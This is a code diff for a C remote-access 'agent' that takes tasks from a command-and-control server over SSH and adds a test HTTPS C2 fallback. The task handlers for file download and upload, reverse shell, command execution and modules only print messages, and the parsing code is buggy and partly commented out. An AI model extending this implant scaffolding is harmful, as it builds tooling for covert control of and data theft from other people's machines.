@@ -1,5 +1,10 @@
 #include "agent.h"
 
+struct tasking_struct{
+	int operation;
+	char *opts;
+};
+
 int func_loop(ssh_session session)
 {
 	/* Primary function loop */
@@ -53,8 +58,8 @@ int func_loop(ssh_session session)
 
 
 ////// REWORK THIS STUFF DOESNT MAKE SENSE
-	while (!quitting)
-	{
+	//while (!quitting)
+	//{
 		// reads data fromthe server
 		nbytes = ssh_channel_read(channel, tasking, sizeof(tasking), 0);
 		printf("read %d bytes from channel\n", nbytes);
@@ -67,7 +72,7 @@ int func_loop(ssh_session session)
 
 		printf("Read data: %s\n", tasking);
 		quitting = parse_tasking(tasking, channel);
-	}
+//	}
 	
   	// close connections
   	ssh_channel_send_eof(channel);
@@ -85,5 +90,123 @@ int parse_tasking(char *tasking, ssh_channel chan){
 		ssh_channel_write(chan, "\0", 2);
 		return 1;
 	}
+
+
+	// get the number of instructions to complete
+	int num = 0;
+	int size = strlen(tasking);
+	char *tmp = tasking;
+	for (; tasking[num]; tasking[num]=='\n' ? num++ : *tasking++);
+	tasking = tmp;
+	printf("Number of tasks to do: %d\n", num);
+	struct tasking_struct tasking_arr[num];
+
+	char *p = strtok(tasking, "\n");
+	printf("Filling the structure array\n");
+	
+	// Parses the data into structure array
+	int i = 0;
+	while(p != NULL)
+	{
+		// get operation int
+		char tmpbf[2];
+		strncat(tmpbf, p, 2);
+		printf(tmpbf);
+		tasking_arr[i].operation = atoi(tmpbf);
+
+		// get options for operation
+		int sz = strlen(p+3);
+		char *dat = malloc(sz);
+		memset(dat, 0, sz);
+		strcat(dat, p+3);
+		tasking_arr[i].opts = dat;
+
+		// clean up and move on
+		p = strtok(NULL, "\n");
+		memset(tmpbf, 0, 2);
+		i++;
+	}
+
+
+	printf("Initializing variables\n");
+
+	for(int j = 0; j < num; j++){
+		switch(tasking_arr[j].operation)
+		{
+		case AGENT_DOWN_FILE:
+			printf("Got tasking to download file %s\n", tasking_arr[j].opts);
+			//ssh_channel_write(chan, )
+			break;
+		case AGENT_REV_SHELL:
+			printf("Got tasking to start reverse shell\n");
+			break;
+		case AGENT_UP_FILE:
+			printf("Got tasking to upload file %s\n", tasking_arr[j].opts);
+			break;
+		case AGENT_EXEC_SC:
+			printf("Got tasking to execute command %s\n", tasking_arr[j].opts);
+			break;
+		case AGENT_EXEC_MODULE:
+			printf("Got tasking to execute module %s\n", tasking_arr[j].opts);
+			break;
+
+		case AGENT_EXIT:
+			break;
+
+		default:
+			printf("Caught unknown tasking value\n");
+			break;
+		}
+	
+	}
 	return 0;
+}
+
+void get_tasking_https(){
+	// Test thing for HTTPS C2 infrastructure, in case of SSH being blocked/filtered
+	CURL *curl;
+  	CURLcode res;
+
+  	curl_global_init(CURL_GLOBAL_DEFAULT);
+
+  	curl = curl_easy_init();
+  	if(curl) {
+    	curl_easy_setopt(curl, CURLOPT_URL, "https://example.com/");
+
+#ifdef SKIP_PEER_VERIFICATION
+    /*
+     * If you want to connect to a site who isn't using a certificate that is
+     * signed by one of the certs in the CA bundle you have, you can skip the
+     * verification of the server's certificate. This makes the connection
+     * A LOT LESS SECURE.
+     *
+     * If you have a CA cert for the server stored someplace else than in the
+     * default bundle, then the CURLOPT_CAPATH option might come handy for
+     * you.
+     */
+    	curl_easy_setopt(curl, CURLOPT_SSL_VERIFYPEER, 0L);
+#endif
+
+#ifdef SKIP_HOSTNAME_VERIFICATION
+    /*
+     * If the site you're connecting to uses a different host name that what
+     * they have mentioned in their server certificate's commonName (or
+     * subjectAltName) fields, libcurl will refuse to connect. You can skip
+     * this check, but this will make the connection less secure.
+     */
+    	curl_easy_setopt(curl, CURLOPT_SSL_VERIFYHOST, 0L);
+#endif
+
+    	/* Perform the request, res will get the return code */
+    	res = curl_easy_perform(curl);
+    	/* Check for errors */
+    	if(res != CURLE_OK)
+      		fprintf(stderr, "curl_easy_perform() failed: %s\n",
+    				curl_easy_strerror(res));
+
+    	/* always cleanup */
+    	curl_easy_cleanup(curl);
+  	}
+
+  	curl_global_cleanup();
 }
